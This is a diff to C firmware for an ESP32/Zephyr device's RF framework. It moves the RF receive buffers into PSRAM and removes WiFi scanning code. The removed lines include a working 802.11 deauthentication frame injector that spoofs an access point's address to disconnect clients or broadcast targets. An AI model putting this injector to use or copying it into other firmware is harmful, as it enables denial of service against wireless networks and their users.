@@ -47,8 +47,19 @@ static K_MUTEX_DEFINE(s_chip_lock);
  * the chip). Shared, so defined here ahead of both users. */
 #define RF_RX_MAX_PACKET    255
 struct rf_rx_packet { uint8_t data[RF_RX_MAX_PACKET]; uint16_t len; };
+#ifndef CONFIG_AKIRA_RF_RX_QUEUE_DEPTH
+#define CONFIG_AKIRA_RF_RX_QUEUE_DEPTH 8
+#endif
+#if defined(CONFIG_SPIRAM)
+/* Put the large queue data buffer in PSRAM to avoid DRAM overflow on S3 boards */
+static uint8_t s_rf_rx_buf[CONFIG_AKIRA_RF_RX_QUEUE_DEPTH * sizeof(struct rf_rx_packet)]
+    __attribute__((section(".ext_ram.bss")));
+static struct k_msgq s_rf_rx_msgq;
+static int s_rf_rx_msgq_inited;
+#else
 K_MSGQ_DEFINE(s_rf_rx_msgq, sizeof(struct rf_rx_packet),
               CONFIG_AKIRA_RF_RX_QUEUE_DEPTH, 4);
+#endif
 
 static akira_rf_chip_t g_active_chip = AKIRA_RF_CHIP_NONE;
 static radio_handle_t *g_active_handle = NULL;
@@ -80,6 +91,14 @@ static radio_handle_t *map_chip_to_handle(akira_rf_chip_t chip)
 int akira_rf_init(akira_rf_chip_t chip)
 {
     LOG_INF("RF init: chip=%d", chip);
+
+#if defined(CONFIG_SPIRAM)
+    if (!s_rf_rx_msgq_inited) {
+        k_msgq_init(&s_rf_rx_msgq, (char *)s_rf_rx_buf,
+                    sizeof(struct rf_rx_packet), CONFIG_AKIRA_RF_RX_QUEUE_DEPTH);
+        s_rf_rx_msgq_inited = 1;
+    }
+#endif
 
     radio_handle_t *handle = map_chip_to_handle(chip);
     if (!handle) {
@@ -314,7 +333,11 @@ radio_handle_t *akira_rf_get_active_handle(void)
 
 #define RF_DAEMON_SLEEP_MS  100
 
+#if defined(CONFIG_SPIRAM)
+static struct rf_rx_packet s_rf_poll_buf __attribute__((section(".ext_ram.bss")));
+#else
 static struct rf_rx_packet s_rf_poll_buf;
+#endif
 
 static void rf_rx_daemon_fn(void *p1, void *p2, void *p3)
 {
@@ -497,326 +520,6 @@ int akira_native_rf_set_power(wasm_exec_env_t exec_env, int8_t dbm)
     return akira_rf_set_power(dbm);
 }
 
-#if defined(CONFIG_WIFI) && defined(CONFIG_AKIRA_RF_FRAMEWORK)
-
-/* ── Spectrum scan (per-channel max RSSI) ────────────────────────────── */
-#define WIFI_SCAN_MAX_CHANNELS 14
-#define WIFI_SCAN_TIMEOUT_MS   5000
-
-struct wifi_scan_ctx {
-    int8_t  rssi[WIFI_SCAN_MAX_CHANNELS];
-    uint8_t seen[WIFI_SCAN_MAX_CHANNELS];
-    struct k_sem done;
-};
-
-static struct wifi_scan_ctx g_wifi_scan_ctx;
-static struct net_mgmt_event_callback g_wifi_scan_cb;
-static bool g_wifi_scan_cb_reg;
-
-static void wifi_scan_event_handler(struct net_mgmt_event_callback *cb,
-                                     uint64_t event, struct net_if *iface)
-{
-    ARG_UNUSED(cb);
-    ARG_UNUSED(iface);
-
-    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
-        const struct wifi_scan_result *entry =
-            (const struct wifi_scan_result *)cb->info;
-        if (entry && entry->channel >= 1 &&
-            entry->channel <= WIFI_SCAN_MAX_CHANNELS) {
-            int ch = entry->channel - 1;
-            if (!g_wifi_scan_ctx.seen[ch] ||
-                entry->rssi > g_wifi_scan_ctx.rssi[ch]) {
-                g_wifi_scan_ctx.rssi[ch] = entry->rssi;
-                g_wifi_scan_ctx.seen[ch] = 1;
-            }
-        }
-    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
-        k_sem_give(&g_wifi_scan_ctx.done);
-    }
-}
-
-int akira_native_wifi_scan_rssi(wasm_exec_env_t exec_env,
-                                 uint32_t buf_ptr, uint32_t buf_len)
-{
-    wasm_module_inst_t module_inst = wasm_runtime_get_module_inst(exec_env);
-    if (!module_inst) {
-        return -1;
-    }
-
-    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
-
-    if (buf_len < WIFI_SCAN_MAX_CHANNELS) {
-        return -EINVAL;
-    }
-
-    int8_t *dst = (int8_t *)wasm_runtime_addr_app_to_native(module_inst, buf_ptr);
-    if (!dst) {
-        return -EFAULT;
-    }
-
-    struct net_if *iface = net_if_get_default();
-    if (!iface) {
-        LOG_ERR("wifi_scan_rssi: no default interface");
-        return -ENODEV;
-    }
-
-    (void)memset(g_wifi_scan_ctx.rssi, RADIO_RSSI_UNAVAILABLE,
-                 sizeof(g_wifi_scan_ctx.rssi));
-    (void)memset(g_wifi_scan_ctx.seen, 0, sizeof(g_wifi_scan_ctx.seen));
-    k_sem_init(&g_wifi_scan_ctx.done, 0, 1);
-
-    if (!g_wifi_scan_cb_reg) {
-        net_mgmt_init_event_callback(&g_wifi_scan_cb,
-                                     wifi_scan_event_handler,
-                                     NET_EVENT_WIFI_SCAN_RESULT |
-                                     NET_EVENT_WIFI_SCAN_DONE);
-        net_mgmt_add_event_callback(&g_wifi_scan_cb);
-        g_wifi_scan_cb_reg = true;
-    }
-
-    LOG_INF("Starting WiFi scan for spectrum analysis");
-
-    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
-    if (ret) {
-        LOG_ERR("WiFi scan request failed: %d", ret);
-        return ret;
-    }
-
-    ret = k_sem_take(&g_wifi_scan_ctx.done, K_MSEC(WIFI_SCAN_TIMEOUT_MS));
-    if (ret) {
-        LOG_WRN("WiFi scan timed out, returning partial results");
-    }
-
-    for (int i = 0; i < WIFI_SCAN_MAX_CHANNELS; i++) {
-        dst[i] = g_wifi_scan_ctx.rssi[i];
-    }
-
-    return WIFI_SCAN_MAX_CHANNELS;
-}
-
-/* ── AP scan (full wifi_scan_result records) ─────────────────────────── */
-
-#define WIFI_APS_MAX          64
-#define WIFI_AP_ENTRY_SIZE    48    /* sizeof(akira_wifi_ap_t) — must match SDK */
-#define WIFI_APS_TIMEOUT_MS   8000
-
-/*
- * Wire struct — layout MUST stay in sync with akira_wifi_ap_t in akira_api.h.
- * Natural alignment gives 48 bytes; verified with BUILD_ASSERT below.
- */
-struct wifi_ap_wire {
-    uint8_t  ssid[33];      /* +0  null-terminated SSID */
-    uint8_t  bssid[6];      /* +33 BSSID (MAC) */
-    uint8_t  channel;       /* +39 2.4 GHz channel 1-14 */
-    int8_t   rssi;          /* +40 signal strength dBm */
-    uint8_t  security;      /* +41 0=open 1=WEP 2=WPA 3=WPA2 4=WPA3 5=ENT */
-    uint8_t  _pad[2];       /* +42 align last_seen_ms to 4-byte boundary */
-    uint32_t last_seen_ms;  /* +44 k_uptime_get_32() when last seen */
-};                          /* total 48 */
-BUILD_ASSERT(sizeof(struct wifi_ap_wire) == WIFI_AP_ENTRY_SIZE,
-             "wifi_ap_wire / akira_wifi_ap_t size mismatch");
-
-static struct wifi_ap_wire              g_aps_buf[WIFI_APS_MAX];
-static int                              g_aps_count;
-static struct k_sem                     g_aps_sem;
-static struct net_mgmt_event_callback   g_aps_cb;
-static bool                             g_aps_cb_reg;
-
-static uint8_t ap_map_security(enum wifi_security_type s)
-{
-    switch (s) {
-    case WIFI_SECURITY_TYPE_NONE:            return 0;
-    case WIFI_SECURITY_TYPE_WEP:             return 1;
-    case WIFI_SECURITY_TYPE_WPA_PSK:         return 2;
-    case WIFI_SECURITY_TYPE_PSK:
-    case WIFI_SECURITY_TYPE_PSK_SHA256:
-    case WIFI_SECURITY_TYPE_WPA_AUTO_PERSONAL:
-    case WIFI_SECURITY_TYPE_FT_PSK:          return 3; /* WPA2 */
-    case WIFI_SECURITY_TYPE_SAE:
-    case WIFI_SECURITY_TYPE_SAE_H2E:
-    case WIFI_SECURITY_TYPE_SAE_AUTO:
-    case WIFI_SECURITY_TYPE_FT_SAE:
-    case WIFI_SECURITY_TYPE_SAE_EXT_KEY:     return 4; /* WPA3 */
-    default:                                 return 5; /* Enterprise / unknown */
-    }
-}
-
-static void wifi_aps_event_handler(struct net_mgmt_event_callback *cb,
-                                    uint64_t event, struct net_if *iface)
-{
-    ARG_UNUSED(iface);
-
-    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
-        if (g_aps_count >= WIFI_APS_MAX) return;
-        const struct wifi_scan_result *e =
-            (const struct wifi_scan_result *)cb->info;
-        if (!e) return;
-
-        /* Deduplicate by BSSID; update RSSI if this reading is stronger */
-        for (int i = 0; i < g_aps_count; i++) {
-            if (memcmp(g_aps_buf[i].bssid, e->mac, 6) == 0) {
-                if (e->rssi > g_aps_buf[i].rssi)
-                    g_aps_buf[i].rssi = e->rssi;
-                g_aps_buf[i].last_seen_ms = k_uptime_get_32();
-                return;
-            }
-        }
-
-        struct wifi_ap_wire *ap = &g_aps_buf[g_aps_count++];
-        uint8_t slen = e->ssid_length < 32u ? e->ssid_length : 32u;
-        memcpy(ap->ssid, e->ssid, slen);
-        ap->ssid[slen]   = '\0';
-        memcpy(ap->bssid, e->mac, 6);
-        ap->channel      = e->channel;
-        ap->rssi         = e->rssi;
-        ap->security     = ap_map_security(e->security);
-        ap->_pad[0]      = 0;
-        ap->_pad[1]      = 0;
-        ap->last_seen_ms = k_uptime_get_32();
-
-    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
-        k_sem_give(&g_aps_sem);
-    }
-}
-
-/*
- * wifi_scan_aps(buf, buf_len) → int
- *
- * Runs a passive 802.11 scan and fills buf with akira_wifi_ap_t records.
- * Blocks up to WIFI_APS_TIMEOUT_MS ms. Returns the number of APs found,
- * or a negative errno on failure.
- *
- * Type string: "(*~)i" — WAMR validates ptr+len against WASM linear memory
- * and converts the WASM offset to a native pointer before the call.
- */
-int akira_native_wifi_scan_aps(wasm_exec_env_t exec_env,
-                                void *buf, uint32_t buf_len)
-{
-    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
-
-    if (!buf || buf_len < WIFI_AP_ENTRY_SIZE) return -EINVAL;
-
-    struct net_if *iface = net_if_get_default();
-    if (!iface) {
-        LOG_ERR("wifi_scan_aps: no default interface");
-        return -ENODEV;
-    }
-
-    uint32_t max_aps = buf_len / WIFI_AP_ENTRY_SIZE;
-    if (max_aps > WIFI_APS_MAX) max_aps = WIFI_APS_MAX;
-
-    memset(g_aps_buf, 0, sizeof(g_aps_buf));
-    g_aps_count = 0;
-    k_sem_init(&g_aps_sem, 0, 1);
-
-    if (!g_aps_cb_reg) {
-        net_mgmt_init_event_callback(&g_aps_cb, wifi_aps_event_handler,
-                                     NET_EVENT_WIFI_SCAN_RESULT |
-                                     NET_EVENT_WIFI_SCAN_DONE);
-        net_mgmt_add_event_callback(&g_aps_cb);
-        g_aps_cb_reg = true;
-    }
-
-    LOG_INF("wifi_scan_aps: starting passive scan");
-    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
-    if (ret) {
-        LOG_ERR("wifi_scan_aps: scan request failed: %d", ret);
-        return ret;
-    }
-
-    ret = k_sem_take(&g_aps_sem, K_MSEC(WIFI_APS_TIMEOUT_MS));
-    if (ret) LOG_WRN("wifi_scan_aps: timeout, returning %d partial results",
-                     g_aps_count);
-
-    uint32_t n = (uint32_t)g_aps_count < max_aps
-                 ? (uint32_t)g_aps_count : max_aps;
-    memcpy(buf, g_aps_buf, n * WIFI_AP_ENTRY_SIZE);
-
-    LOG_INF("wifi_scan_aps: done — %d APs", g_aps_count);
-    return (int)n;
-}
-
-/* ── 802.11 deauthentication frame injector ─────────────────────────────── */
-
-/*
- * 802.11 Management frame: Deauthentication (subtype 0xC).
- * 24-byte fixed layout per IEEE 802.11-2020 §9.3.3.1.
- */
-struct __attribute__((packed)) deauth_frame {
-    uint8_t  fc[2];      /* 0xC0 0x00 — Management, Deauthentication            */
-    uint8_t  dur[2];     /* 0x3A 0x01 — NAV duration (~314 µs)                  */
-    uint8_t  da[6];      /* Destination: target client or FF:FF:FF:FF:FF:FF      */
-    uint8_t  sa[6];      /* Source: spoofed as AP BSSID                          */
-    uint8_t  bssid[6];   /* BSS ID: AP BSSID                                     */
-    uint8_t  seq[2];     /* Sequence control (incremented per frame)             */
-    uint8_t  reason[2];  /* Reason code LE: 7 = Class-3 frame from non-assoc STA */
-};
-
-BUILD_ASSERT(sizeof(struct deauth_frame) == 24, "deauth_frame must be 24 bytes");
-
-#define DEAUTH_MAX_COUNT      9999
-#define DEAUTH_MIN_INTERVAL_MS  10
-
-/*
- * wifi_deauth(bssid, client_mac, channel, count, interval_ms) → int
- *
- * Injects `count` 802.11 deauthentication frames directed at `client_mac`
- * (or broadcast FF:FF:FF:FF:FF:FF) from `bssid` on `channel`.
- * `interval_ms` is the inter-frame gap (min 10 ms).
- *
- * Returns the number of frames sent, or negative errno on error.
- * Requires AKIRA_CAP_WIFI_INJECT.
- *
- * Type string: "(**iii)i"
- */
-int akira_native_wifi_deauth(wasm_exec_env_t exec_env,
-                              void *bssid_ptr, void *client_ptr,
-                              int32_t channel, int32_t count, int32_t interval_ms)
-{
-    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);
-
-    if (!bssid_ptr || !client_ptr)          return -EINVAL;
-    if (channel < 1 || channel > 14)        return -EINVAL;
-    if (count   < 1 || count > DEAUTH_MAX_COUNT) return -EINVAL;
-    if (interval_ms < DEAUTH_MIN_INTERVAL_MS) interval_ms = DEAUTH_MIN_INTERVAL_MS;
-
-    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
-    WASM_ADDR_CHECK(inst, bssid_ptr,  6);
-    WASM_ADDR_CHECK(inst, client_ptr, 6);
-
-    const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
-    const uint8_t *client = (const uint8_t *)client_ptr;
-
-    /* Set the radio to the target channel before injection */
-    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
-
-    struct deauth_frame frame;
-    frame.fc[0]     = 0xC0; frame.fc[1]     = 0x00;
-    frame.dur[0]    = 0x3A; frame.dur[1]    = 0x01;
-    frame.reason[0] = 0x07; frame.reason[1] = 0x00; /* Reason 7 */
-    memcpy(frame.da,    client, 6);
-    memcpy(frame.sa,    bssid,  6);
-    memcpy(frame.bssid, bssid,  6);
-
-    int sent = 0;
-    for (int32_t i = 0; i < count; i++) {
-        /* Increment sequence number — low 12 bits of seq[0:1], LE */
-        uint16_t seq = (uint16_t)(i << 4);
-        frame.seq[0] = (uint8_t)(seq & 0xFF);
-        frame.seq[1] = (uint8_t)(seq >> 8);
-
-        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true);
-        if (err == ESP_OK) sent++;
-
-        if (i < count - 1) k_msleep(interval_ms);
-    }
-
-    LOG_INF("wifi_deauth: channel=%d count=%d sent=%d", channel, count, sent);
-    return sent;
-}
-
-#endif /* CONFIG_WIFI && CONFIG_AKIRA_RF_FRAMEWORK */
 
 /* ── Raw Sub-GHz OOK capture / replay ──────────────────────────────────── */
 
